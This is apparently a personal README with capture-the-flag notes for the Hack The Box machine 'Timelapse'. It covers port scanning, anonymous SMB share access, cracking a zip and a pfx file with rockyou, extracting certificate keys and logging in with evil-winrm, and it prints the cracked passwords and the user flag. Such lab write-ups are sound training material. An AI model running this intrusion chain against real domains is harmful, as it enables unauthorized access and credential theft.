<div id="top"></div>
<!--
*** Thanks for checking out the Best-README-Template. If you have a suggestion
*** that would make this better, please fork the repo and create a pull request
*** or simply open an issue with the tag "enhancement".
*** Don't forget to give the project a star!
*** Thanks again! Now go create something AMAZING! :D
-->



<!-- PROJECT SHIELDS -->
<!--
*** I'm using markdown "reference style" links for readability.
*** Reference links are enclosed in brackets [ ] instead of parentheses ( ).
*** See the bottom of this document for the declaration of the reference variables
*** for contributors-url, forks-url, etc. This is an optional, concise syntax you may use.
*** https://www.markdownguide.org/basic-syntax/#reference-style-links
-->



<!-- PROJECT LOGO -->
<br />
<div align="center">

<h1 align="center">HTB Timelapse Notes</h1>

</div>

![Timelapse](https://user-images.githubusercontent.com/19478700/173301506-f8a85cbf-aafd-4028-85c9-63cfae763820.png)





<!-- ABOUT THE PROJECT -->
## About The Project
Timelapse HTB Machine


## Steps

### 1. Nmap Scans:
  ```sh
   nmap -p- 10.10.11.152
   ```
   ```sh
      PORT      STATE SERVICE          REASON
      53/tcp    open  domain           syn-ack ttl 127
      88/tcp    open  kerberos-sec     syn-ack ttl 127
      135/tcp   open  msrpc            syn-ack ttl 127
      139/tcp   open  netbios-ssn      syn-ack ttl 127
      389/tcp   open  ldap             syn-ack ttl 127
      445/tcp   open  microsoft-ds     syn-ack ttl 127
      464/tcp   open  kpasswd5         syn-ack ttl 127
      593/tcp   open  http-rpc-epmap   syn-ack ttl 127
      636/tcp   open  ldapssl          syn-ack ttl 127
      3268/tcp  open  globalcatLDAP    syn-ack ttl 127
      3269/tcp  open  globalcatLDAPssl syn-ack ttl 127
      5986/tcp  open  wsmans           syn-ack ttl 127
      9389/tcp  open  adws             syn-ack ttl 127
      49667/tcp open  unknown          syn-ack ttl 127
      49673/tcp open  unknown          syn-ack ttl 127
      49674/tcp open  unknown          syn-ack ttl 127
      49696/tcp open  unknown          syn-ack ttl 127
      51231/tcp open  unknown          syn-ack ttl 127
   ```


```sh
   nmap -sVC 10.10.11.152
   ```


```sh
   PORT     STATE SERVICE       REASON          VERSION
53/tcp   open  domain        syn-ack ttl 127 Simple DNS Plus
88/tcp   open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2022-06-13 15:03:29Z)
135/tcp  open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp  open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds? syn-ack ttl 127
464/tcp  open  kpasswd5?     syn-ack ttl 127
593/tcp  open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ldapssl?      syn-ack ttl 127
3268/tcp open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name)
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
   ```
   
   

### 2.SMB Enumeration:
  ```sh
   smbclient -N -L 10.10.11.152
   ```

   ```sh
   Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        Shares          Disk      
        SYSVOL          Disk      Logon server share 
   ```

  Ivestiating we find several files on Shares share:

   ```sh
   smbclient \\\\10.10.11.152\\Shares
   ```

   ```sh
    LAPS_Datasheet.docx               LAPS.x64.msi
    LAPS_OperationsGuide.docx         winrm_backup.zip
    LAPS_TechnicalSpecification.docx

   ```

  winrm_backup seems interesting but its password protected.
  DOCX Files contain documentation about how passwords are managed arround the directory.
  
### 3.Cracking ZIP:
  
  lets try to crack the zip
   ```sh
   fcrackzip -D -u winrm_backup.zip -p /usr/share/wordlists/rockyou.txt
   ```
   ```sh
   PASSWORD FOUND!!!!: pw == supremelegacy
   ```
   Zip password was weak: supremelegacy
   We obtain legacyy_dev_auth.pfx
   
   

### 4.Cracking pfx:
  A quick Google search about extracting cert keys from pfx:
  https://www.ibm.com/docs/en/arl/9.7?topic=certification-extracting-certificate-keys-from-pfx-file
  but we need to obtain the pfx key first so we are gonna try to crack it using john
  Convert:
  ```sh
  pfx2john legacyy_dev_auth.pfx > pfx_john_legacy.hash
  ```
  
  ```sh
  john -w=/usr/share/wordlists/rockyou.txt pfx_john_legacy.hash 
  ```
  
  ```sh
Using default input encoding: UTF-8
Loaded 1 password hash (pfx, (.pfx, .p12) [PKCS#12 PBE (SHA1/SHA2) 128/128 AVX 4x])
Cost 1 (iteration count) is 2000 for all loaded hashes
Cost 2 (mac-type [1:SHA1 224:SHA224 256:SHA256 384:SHA384 512:SHA512]) is 1 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
thuglegacy       (legacyy_dev_auth.pfx)     
1g 0:00:02:13 DONE (2022-06-13 04:00) 0.007506g/s 24256p/s 24256c/s 24256C/s thuglife03282006..thug209
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```
  Found pfx pass: thuglegacy
  
  Now lets extract key and cert:
  
  Extract cert:
   ```sh
   openssl pkcs12 -in legacyy_dev_auth.pfx -out cert.pem
   ```
   
   Extract priv key:
   ```sh
   openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out priv.pem -nodes
   ``` 
   
   After formatting the files correctly we can connect via ssh:
   
   ```sh
   evil-winrm -S -k formated/key.key -c formated/cert.crt -i 10.10.11.152
   ``` 

![image](https://user-images.githubusercontent.com/19478700/173311463-09780f02-46e4-4b45-8b29-035ae846986b.png)

  
##### USER FLAG OWNED

acb916822269ae7d9417c7c998749b8e

   
### 5:Privilege Escalation (System OWN):





<!-- LICENSE -->
## License

Distributed under the MIT License. See `LICENSE.txt` for more information.

<p align="right">(<a href="#top">back to top</a>)</p>



<!-- CONTACT -->
## Contact

Pol Galvez - polgalvezsoriano@gmail.com

<p align="right">(<a href="#top">back to top</a>)</p>



<!-- ACKNOWLEDGMENTS -->
## Acknowledgments

* [aidenpearce369.github.io](aidenpearce369.github.io)

<p align="right">(<a href="#top">back to top</a>)</p>



<!-- MARKDOWN LINKS & IMAGES -->
<!-- https://www.markdownguide.org/basic-syntax/#reference-style-links -->
[contributors-shield]: https://img.shields.io/github/contributors/github_username/repo_name.svg?style=for-the-badge
[contributors-url]: https://github.com/github_username/repo_name/graphs/contributors
[forks-shield]: https://img.shields.io/github/forks/github_username/repo_name.svg?style=for-the-badge
[forks-url]: https://github.com/github_username/repo_name/network/members
[stars-shield]: https://img.shields.io/github/stars/github_username/repo_name.svg?style=for-the-badge
[stars-url]: https://github.com/github_username/repo_name/stargazers
[issues-shield]: https://img.shields.io/github/issues/github_username/repo_name.svg?style=for-the-badge
[issues-url]: https://github.com/github_username/repo_name/issues
[license-shield]: https://img.shields.io/github/license/github_username/repo_name.svg?style=for-the-badge
[license-url]: https://github.com/github_username/repo_name/blob/master/LICENSE.txt
[linkedin-shield]: https://img.shields.io/badge/-LinkedIn-black.svg?style=for-the-badge&logo=linkedin&colorB=555
[linkedin-url]: https://linkedin.com/in/linkedin_username
[product-screenshot]: images/screenshot.png
